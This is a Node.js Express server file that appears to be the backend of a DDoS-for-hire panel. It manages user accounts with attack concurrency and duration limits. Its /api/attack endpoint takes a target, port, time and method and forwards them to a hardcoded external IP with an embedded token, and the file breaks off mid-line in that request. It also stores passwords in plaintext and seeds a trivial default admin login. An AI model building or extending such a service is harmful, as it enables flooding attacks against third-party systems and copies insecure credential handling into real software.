const express = require('express');
const fs = require('fs');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

const USERS_FILE = './memek.json';

function readUsers() {
  if (!fs.existsSync(USERS_FILE)) return [];
  return JSON.parse(fs.readFileSync(USERS_FILE));
}

function writeUsers(users) {
  fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
}

// Initialize default admin
const users = readUsers();
if (!users.find(u => u.user === '1')) {
  users.push({ user: '1', pass: '1', isAdmin: true });
  writeUsers(users);
}

app.post('/api/login', (req, res) => {
  const { user, pass } = req.body;
  const found = readUsers().find(u => u.user === user && u.pass === pass);
  if (!found) return res.status(401).json({ error: 'Invalid credentials' });
  res.json({ success: true, isAdmin: !!found.isAdmin });
});

app.post('/api/create-user', (req, res) => {
  const { adminUser, adminPass, newUser, newPass, conc, days, maxTime } = req.body;
  const users = readUsers();
  const admin = users.find(u => u.user === adminUser && u.pass === adminPass && u.isAdmin);
  if (!admin) return res.status(403).json({ message: 'Forbidden' });

  if (users.find(u => u.user === newUser)) return res.status(400).json({ message: 'User exists' });

  users.push({ user: newUser, pass: newPass, conc, days, maxTime, isAdmin: false });
  writeUsers(users);
  res.json({ message: 'User created' });
});

app.post('/api/attack', (req, res) => {
  const { target, port, time, method } = req.body;
  const token = 'kobosky';
  const apiUrl = `http://37.27.169.207:20835/api/attack?token=${token}&
